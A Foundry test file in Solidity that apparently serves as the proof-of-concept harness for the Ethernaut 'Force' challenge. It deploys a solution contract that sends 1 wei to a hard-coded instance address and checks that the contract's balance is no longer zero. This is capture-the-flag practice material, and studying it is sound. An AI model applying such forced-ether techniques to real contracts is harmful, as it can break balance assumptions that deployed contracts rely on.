// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../src/8_ForceSolution.sol";

address constant INSTANCE = 0xB7690132c2236b969d19931f87e839870c72c7bB;

contract ForcePOCTest is Test {
    function test() external {
        vm.startBroadcast();
        assertEq(address(INSTANCE).balance, 0);

        ForceSolution solution = new ForceSolution();
        solution.solve{value: 1 wei}(0xB7690132c2236b969d19931f87e839870c72c7bB);

        assertNotEq(address(INSTANCE).balance, 0);
        vm.stopBroadcast();
    }
}